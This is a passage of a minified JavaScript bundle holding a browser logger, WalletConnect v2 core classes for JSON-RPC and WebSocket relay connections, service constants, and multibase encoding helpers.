L.serializers,c([L],G,Z,this._stdErrSerialize)}function ne(de){this._childLevel=(de._childLevel|0)+1,this.error=l(de,L,"error"),this.fatal=l(de,L,"fatal"),this.warn=l(de,L,"warn"),this.info=l(de,L,"info"),this.debug=l(de,L,"debug"),this.trace=l(de,L,"trace"),Z&&(this.serializers=Z,this._serialize=G),N&&(this._logEvent=h([].concat(de._logEvent.bindings,L)))}return ne.prototype=this,new ne(this)}return O}i.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},i.stdSerializers=r,i.stdTimeFunctions=Object.assign({},{nullTime:m,epochTime:b,unixTime:v,isoTime:x});function s(C,N,S,P){const T=Object.getPrototypeOf(N);N[S]=N.levelVal>N.levels.values[S]?w:T[S]?T[S]:e[S]||e[P]||w,o(C,N,S)}function o(C,N,S){!C.transmit&&N[S]===w||(N[S]=function(P){return function(){const D=C.timestamp(),z=new Array(arguments.length),V=Object.getPrototypeOf&&Object.getPrototypeOf(this)===e?e:this;for(var O=0;O<z.length;O++)z[O]=arguments[O];if(C.serialize&&!C.asObject&&c(z,this._serialize,this.serializers,this._stdErrSerialize),C.asObject?P.call(V,a(this,S,z,D)):P.apply(V,z),C.transmit){const y=C.transmit.level||N.level,E=i.levels.values[y],k=i.levels.values[S];if(k<E)return;u(this,{ts:D,methodLevel:S,methodValue:k,transmitValue:i.levels.values[C.transmit.level||N.level],send:C.transmit.send,val:N.levelVal},z)}}}(N[S]))}function a(C,N,S,P){C._serialize&&c(S,C._serialize,C.serializers,C._stdErrSerialize);const T=S.slice();let D=T[0];const z={};P&&(z.time=P),z.level=i.levels.values[N];let V=(C._childLevel|0)+1;if(V<1&&(V=1),D!==null&&typeof D=="object"){for(;V--&&typeof T[0]=="object";)Object.assign(z,T.shift());D=T.length?t(T.shift(),T):void 0}else typeof D=="string"&&(D=t(T.shift(),T));return D!==void 0&&(z.msg=D),z}function c(C,N,S,P){for(const T in C)if(P&&C[T]instanceof Error)C[T]=i.stdSerializers.err(C[T]);else if(typeof C[T]=="object"&&!Array.isArray(C[T]))for(const D in C[T])N&&N.indexOf(D)>-1&&D in S&&(C[T][D]=S[D](C[T][D]))}function l(C,N,S){return function(){const P=new Array(1+arguments.length);P[0]=N;for(var T=1;T<P.length;T++)P[T]=arguments[T-1];return C[S].apply(this,P)}}function u(C,N,S){const P=N.send,T=N.ts,D=N.methodLevel,z=N.methodValue,V=N.val,O=C._logEvent.bindings;c(S,C._serialize||Object.keys(C.serializers),C.serializers,C._stdErrSerialize===void 0?!0:C._stdErrSerialize),C._logEvent.ts=T,C._logEvent.messages=S.filter(function(y){return O.indexOf(y)===-1}),C._logEvent.level.label=D,C._logEvent.level.value=z,P(D,C._logEvent,V),C._logEvent=h(O)}function h(C){return{ts:0,messages:[],bindings:C||[],level:{label:"",value:0}}}function d(C){const N={type:C.constructor.name,msg:C.message,stack:C.stack};for(const S in C)N[S]===void 0&&(N[S]=C[S]);return N}function f(C){return typeof C.timestamp=="function"?C.timestamp:C.timestamp===!1?m:b}function g(){return{}}function p(C){return C}function w(){}function m(){return!1}function b(){return Date.now()}function v(){return Math.round(Date.now()/1e3)}function x(){return new Date(Date.now()).toISOString()}function I(){function C(N){return typeof N<"u"&&N}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return C(self)||C(window)||C(this)||{}}}return lw}var vl=zR();const Kf=_b(vl),jR={level:"info"},Zf="custom_context",Zb=1e3*1024;let HR=class{constructor(e){this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return this.sizeInBytes}},K3=class{constructor(e){this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const r=new HR(e);if(r.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${r.size}`);for(;this.size+r.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=r),this.tail=r):(this.head=r,this.tail=r),this.lengthInNodes++,this.sizeInBytes+=r.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let r=this.head;for(;r!==null;)e.push(r.value),r=r.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const r=e.value;return e=e.next,{done:!1,value:r}}}}},$C=class{constructor(e,r=Zb){this.level=e??"error",this.levelValue=vl.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=r,this.logs=new K3(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,r){r===vl.levels.values.error?console.error(e):r===vl.levels.values.warn?console.warn(e):r===vl.levels.values.debug?console.debug(e):r===vl.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(js({timestamp:new Date().toISOString(),log:e}));const r=typeof e=="string"?JSON.parse(e).level:e.level;r>=this.levelValue&&this.forwardToConsole(e,r)}getLogs(){return this.logs}clearLogs(){this.logs=new K3(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const r=this.getLogArray();return r.push(js({extraMetadata:e})),new Blob(r,{type:"application/json"})}},qR=class{constructor(e,r=Zb){this.baseChunkLogger=new $C(e,r)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const r=URL.createObjectURL(this.logsToBlob(e)),n=document.createElement("a");n.href=r,n.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(r)}},VR=class{constructor(e,r=Zb){this.baseChunkLogger=new $C(e,r)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}};var WR=Object.defineProperty,GR=Object.defineProperties,KR=Object.getOwnPropertyDescriptors,Z3=Object.getOwnPropertySymbols,ZR=Object.prototype.hasOwnProperty,JR=Object.prototype.propertyIsEnumerable,J3=(t,e,r)=>e in t?WR(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,tg=(t,e)=>{for(var r in e||(e={}))ZR.call(e,r)&&J3(t,r,e[r]);if(Z3)for(var r of Z3(e))JR.call(e,r)&&J3(t,r,e[r]);return t},rg=(t,e)=>GR(t,KR(e));function Zg(t){return rg(tg({},t),{level:(t==null?void 0:t.level)||jR.level})}function QR(t,e=Zf){return t[e]||""}function YR(t,e,r=Zf){return t[r]=e,t}function Jr(t,e=Zf){let r="";return typeof t.bindings>"u"?r=QR(t,e):r=t.bindings().context||"",r}function XR(t,e,r=Zf){const n=Jr(t,r);return n.trim()?`${n}/${e}`:e}function _r(t,e,r=Zf){const n=XR(t,e,r),i=t.child({context:n});return YR(i,n,r)}function eD(t){var e,r;const n=new qR((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Kf(rg(tg({},t.opts),{level:"trace",browser:rg(tg({},(r=t.opts)==null?void 0:r.browser),{write:i=>n.write(i)})})),chunkLoggerController:n}}function tD(t){var e;const r=new VR((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Kf(rg(tg({},t.opts),{level:"trace"}),r),chunkLoggerController:r}}function rD(t){return typeof t.loggerOverride<"u"&&typeof t.loggerOverride!="string"?{logger:t.loggerOverride,chunkLoggerController:null}:typeof window<"u"?eD(t):tD(t)}var nD=Object.defineProperty,iD=(t,e,r)=>e in t?nD(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Q3=(t,e,r)=>iD(t,typeof e!="symbol"?e+"":e,r);let sD=class extends Bc{constructor(e){super(),this.opts=e,Q3(this,"protocol","wc"),Q3(this,"version",2)}};var oD=Object.defineProperty,aD=(t,e,r)=>e in t?oD(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,cD=(t,e,r)=>aD(t,e+"",r);let lD=class extends Bc{constructor(e,r){super(),this.core=e,this.logger=r,cD(this,"records",new Map)}},uD=class{constructor(e,r){this.logger=e,this.core=r}};class hD extends Bc{constructor(e,r){super(),this.relayer=e,this.logger=r}}let dD=class extends Bc{constructor(e){super()}},fD=class{constructor(e,r,n,i){this.core=e,this.logger=r,this.name=n}},pD=class extends Bc{constructor(e,r){super(),this.relayer=e,this.logger=r}},gD=class extends Bc{constructor(e,r){super(),this.core=e,this.logger=r}},wD=class{constructor(e,r,n){this.core=e,this.logger=r,this.store=n}},mD=class{constructor(e,r){this.projectId=e,this.logger=r}},yD=class{constructor(e,r,n){this.core=e,this.logger=r,this.telemetryEnabled=n}};var bD=Object.defineProperty,vD=(t,e,r)=>e in t?bD(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Y3=(t,e,r)=>vD(t,typeof e!="symbol"?e+"":e,r);let ED=class{constructor(e){this.opts=e,Y3(this,"protocol","wc"),Y3(this,"version",2)}},CD=class{constructor(e){this.client=e}};const AD="PARSE_ERROR",xD="INVALID_REQUEST",ID="METHOD_NOT_FOUND",SD="INVALID_PARAMS",RC="INTERNAL_ERROR",Jb="SERVER_ERROR",ND=[-32700,-32600,-32601,-32602,-32603],Ed={[AD]:{code:-32700,message:"Parse error"},[xD]:{code:-32600,message:"Invalid Request"},[ID]:{code:-32601,message:"Method not found"},[SD]:{code:-32602,message:"Invalid params"},[RC]:{code:-32603,message:"Internal error"},[Jb]:{code:-32e3,message:"Server error"}},DC=Jb;function PD(t){return ND.includes(t)}function X3(t){return Object.keys(Ed).includes(t)?Ed[t]:Ed[DC]}function kD(t){const e=Object.values(Ed).find(r=>r.code===t);return e||Ed[DC]}function BC(t,e,r){return t.message.includes("getaddrinfo ENOTFOUND")||t.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${r} RPC url at ${e}`):t}var uw={},Xi={},e5;function OD(){if(e5)return Xi;e5=1,Object.defineProperty(Xi,"__esModule",{value:!0}),Xi.isBrowserCryptoAvailable=Xi.getSubtleCrypto=Xi.getBrowerCrypto=void 0;function t(){return(Mi==null?void 0:Mi.crypto)||(Mi==null?void 0:Mi.msCrypto)||{}}Xi.getBrowerCrypto=t;function e(){const n=t();return n.subtle||n.webkitSubtle}Xi.getSubtleCrypto=e;function r(){return!!t()&&!!e()}return Xi.isBrowserCryptoAvailable=r,Xi}var es={},t5;function _D(){if(t5)return es;t5=1,Object.defineProperty(es,"__esModule",{value:!0}),es.isBrowser=es.isNode=es.isReactNative=void 0;function t(){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"}es.isReactNative=t;function e(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}es.isNode=e;function r(){return!t()&&!e()}return es.isBrowser=r,es}var r5;function TD(){return r5||(r5=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Lf;e.__exportStar(OD(),t),e.__exportStar(_D(),t)}(uw)),uw}var $D=TD();function ki(t=3){const e=Date.now()*Math.pow(10,t),r=Math.floor(Math.random()*Math.pow(10,t));return e+r}function $a(t=6){return BigInt(ki(t))}function $o(t,e,r){return{id:r||ki(),jsonrpc:"2.0",method:t,params:e}}function Jg(t,e){return{id:t,jsonrpc:"2.0",result:e}}function Qg(t,e,r){return{id:t,jsonrpc:"2.0",error:RD(e)}}function RD(t,e){return typeof t>"u"?X3(RC):(typeof t=="string"&&(t=Object.assign(Object.assign({},X3(Jb)),{message:t})),PD(t.code)&&(t=kD(t.code)),t)}class DD{}let BD=class extends DD{constructor(){super()}};class LD extends BD{constructor(e){super()}}const UD="^https?:",MD="^wss?:";function FD(t){const e=t.match(new RegExp(/^\w+:/,"gi"));if(!(!e||!e.length))return e[0]}function LC(t,e){const r=FD(t);return typeof r>"u"?!1:new RegExp(e).test(r)}function n5(t){return LC(t,UD)}function i5(t){return LC(t,MD)}function zD(t){return new RegExp("wss?://localhost(:d{2,5})?").test(t)}function UC(t){return typeof t=="object"&&"id"in t&&"jsonrpc"in t&&t.jsonrpc==="2.0"}function Qb(t){return UC(t)&&"method"in t}function Yg(t){return UC(t)&&(Oi(t)||Mn(t))}function Oi(t){return"result"in t}function Mn(t){return"error"in t}let jn=class extends LD{constructor(e){super(e),this.events=new mn.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async request(e,r){return this.requestStrict($o(e.method,e.params||[],e.id||$a().toString()),r)}async requestStrict(e,r){return new Promise(async(n,i)=>{if(!this.connection.connected)try{await this.open()}catch(s){i(s)}this.events.on(`${e.id}`,s=>{Mn(s)?i(s.error):n(s.result)});try{await this.connection.send(e,r)}catch(s){i(s)}})}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),Yg(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&e.code===3e3&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),typeof e=="string"&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",e=>this.onPayload(e)),this.connection.on("close",e=>this.onClose(e)),this.connection.on("error",e=>this.events.emit("error",e)),this.connection.on("register_error",e=>this.onClose()),this.hasRegisteredEventListeners=!0)}};const jD=()=>typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),HD=()=>typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",s5=t=>t.split("?")[0],o5=10,qD=jD();let VD=class{constructor(e){if(this.url=e,this.events=new mn.EventEmitter,this.registering=!1,!i5(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async open(e=this.url){await this.register(e)}async close(){return new Promise((e,r)=>{if(typeof this.socket>"u"){r(new Error("Connection already closed"));return}this.socket.onclose=n=>{this.onClose(n),e()},this.socket.close()})}async send(e){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(js(e))}catch(r){this.onError(e.id,r)}}register(e=this.url){if(!i5(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const r=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=r||this.events.listenerCount("open")>=r)&&this.events.setMaxListeners(r+1),new Promise((n,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return i(new Error("WebSocket connection is missing or invalid"));n(this.socket)})})}return this.url=e,this.registering=!0,new Promise((r,n)=>{const i=$D.isReactNative()?void 0:{rejectUnauthorized:!zD(e)},s=new qD(e,[],i);HD()?s.onerror=o=>{const a=o;n(this.emitError(a.error))}:s.on("error",o=>{n(this.emitError(o))}),s.onopen=()=>{this.onOpen(s),r(s)}})}onOpen(e){e.onmessage=r=>this.onPayload(r),e.onclose=r=>this.onClose(r),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const r=typeof e.data=="string"?yc(e.data):e.data;this.events.emit("payload",r)}onError(e,r){const n=this.parseError(r),i=n.message||n.toString(),s=Qg(e,i);this.events.emit("payload",s)}parseError(e,r=this.url){return BC(e,s5(r),"WS")}resetMaxListeners(){this.events.getMaxListeners()>o5&&this.events.setMaxListeners(o5)}emitError(e){const r=this.parseError(new Error((e==null?void 0:e.message)||`WebSocket connection failed for host: ${s5(this.url)}`));return this.events.emit("register_error",r),r}};var WD={};const MC="wc",FC=2,cy="core",Ki=`${MC}@2:${cy}:`,GD={logger:"error"},KD={database:":memory:"},ZD="crypto",a5="client_ed25519_seed",JD=X.ONE_DAY,QD="keychain",YD="0.3",XD="messages",eB="0.3",c5=X.SIX_HOURS,tB="publisher",zC="irn",rB="error",jC="wss://relay.walletconnect.org",nB="relayer",Kt={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},iB="_subscription",vn={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},sB=.1,ly="2.20.2",mt={link_mode:"link_mode",relay:"relay"},R0={inbound:"inbound",outbound:"outbound"},oB="0.3",aB="WALLETCONNECT_CLIENT_ID",l5="WALLETCONNECT_LINK_MODE_APPS",on={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},cB="subscription",lB="0.3",uB="pairing",hB="0.3",Sh={wc_pairingDelete:{req:{ttl:X.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:X.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:X.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:X.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:X.ONE_DAY,prompt:!1,tag:0},res:{ttl:X.ONE_DAY,prompt:!1,tag:0}}},xa={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},Vn={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},dB="history",fB="0.3",pB="expirer",Tn={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},gB="0.3",wB="verify-api",mB="https://verify.walletconnect.com",HC="https://verify.walletconnect.org",Cd=HC,yB=`${Cd}/v3`,bB=[mB,HC],vB="echo",EB="https://echo.walletconnect.com",Ni={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},ds={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},Wn={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success"},Yo={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found"},Xo={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},Nh={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},CB=.1,AB="event-client",xB=86400,IB="https://pulse.walletconnect.org/batch";function SB(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(r[o]!==255)throw new TypeError(s+" is ambiguous");r[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(g){if(g instanceof Uint8Array||(ArrayBuffer.isView(g)?g=new Uint8Array(g.buffer,g.byteOffset,g.byteLength):Array.isArray(g)&&(g=Uint8Array.from(g))),!(g instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(g.length===0)return"";for(var p=0,w=0,m=0,b=g.length;m!==b&&g[m]===0;)m++,p++;for(var v=(b-m)*u+1>>>0,x=new Uint8Array(v);m!==b;){for(var I=g[m],C=0,N=v-1;(I!==0||C<w)&&N!==-1;N--,C++)I+=256*x[N]>>>0,x[N]=I%a>>>0,I=I/a>>>0;if(I!==0)throw new Error("Non-zero carry");w=C,m++}for(var S=v-w;S!==v&&x[S]===0;)S++;for(var P=c.repeat(p);S<v;++S)P+=t.charAt(x[S]);return P}function d(g){if(typeof g!="string")throw new TypeError("Expected String");if(g.length===0)return new Uint8Array;var p=0;if(g[p]!==" "){for(var w=0,m=0;g[p]===c;)w++,p++;for(var b=(g.length-p)*l+1>>>0,v=new Uint8Array(b);g[p];){var x=r[g.charCodeAt(p)];if(x===255)return;for(var I=0,C=b-1;(x!==0||I<m)&&C!==-1;C--,I++)x+=a*v[C]>>>0,v[C]=x%256>>>0,x=x/256>>>0;if(x!==0)throw new Error("Non-zero carry");m=I,p++}if(g[p]!==" "){for(var N=b-m;N!==b&&v[N]===0;)N++;for(var S=new Uint8Array(w+(b-N)),P=w;N!==b;)S[P++]=v[N++];return S}}}function f(g){var p=d(g);if(p)return p;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:d,decode:f}}var NB=SB,PB=NB;const qC=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},kB=t=>new TextEncoder().encode(t),OB=t=>new TextDecoder().decode(t);let _B=class{constructor(e,r,n){this.name=e,this.prefix=r,this.baseEncode=n}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},TB=class{constructor(e,r,n){if(this.name=e,this.prefix=r,r.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=r.codePointAt(0),this.baseDecode=n}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return VC(this,e)}},$B=class{constructor(e){this.decoders=e}or(e){return VC(this,e)}decode(e){const r=e[0],n=this.decoders[r];if(n)return n.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const VC=(t,e)=>new $B({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});let RB=class{constructor(e,r,n,i){this.name=e,this.prefix=r,this.baseEncode=n,this.baseDecode=i,this.encoder=new _B(e,r,n),this.decoder=new TB(e,r,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const Xg=({name:t,prefix:e,encode:r,decode:n})=>new RB(t,e,r,n),Jf=({prefix:t,name:e,alphabet:r})=>{const{encode:n,decode:i}=PB(r,e);return Xg({prefix:t,name:e,encode:n,decode:s=>qC(i(s))})},DB=(t,e,r,n)=>{const i={};for(let u=0;u<e.length;++u)i[e[u]]=u;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*r/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const h=i[t[u]];if(h===void 0)throw new SyntaxError(`Non-${n} character`);c=c<<r|h,a+=r,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},BB=(t,e,r)=>{const n=e[e.length-1]==="=",i=(1<<r)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>r;)o-=r,s+=e[i&a>>o];if(o&&(s+=e[i&a<<r-o]),n)for(;s.length*r&7;)s+="=";return s},ur=({name:t,prefix:e,bitsPerChar:r,alphabet:n})=>Xg({prefix:e,name:t,encode(i){return BB(i,n,r)},decode(i){return DB(i,n,r,t)}}),LB=Xg({prefix:"\0",name:"identity",encode:t=>OB(t),decode:t=>kB(t)});var UB=Object.freeze({__proto__:null,identity:LB});const MB=ur({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var FB=Object.freeze({__proto__:null,base2:MB});const zB=ur({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var jB=Object.freeze({__proto__:null,base8:zB});const HB=Jf({prefix:"9",name:"base10",alphabet:"0123456789"});var qB=Object.freeze({__proto__:null,base10:HB});const VB=ur({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),WB=ur({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var GB=Object.freeze({__proto__:null,base16:VB,base16upper:WB});const KB=ur({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),ZB=ur({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),JB=ur({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),QB=ur({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),YB=ur({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),XB=ur({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),eL=ur({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),tL=ur({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),rL=ur({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var nL=Object.freeze({__proto__:null,base32:KB,base32upper:ZB,base32pad:JB,base32padupper:QB,base32hex:YB,base32hexupper:XB,base32hexpad:eL,base32hexpadupper:tL,base32z:rL});const iL=Jf({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),sL=Jf({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var oL=Object.freeze({__proto__:null,base36:iL,base36upper:sL});const aL=Jf({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),cL=Jf({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var lL=Object.freeze({__proto__:null,base58btc:aL,base58flickr:cL});const uL=ur({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),hL=ur({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),dL=ur({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),fL=ur({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var pL=Object.freeze({__proto__:null,base64:uL,base64pad:hL,base64url:dL,base64urlpad:fL});const 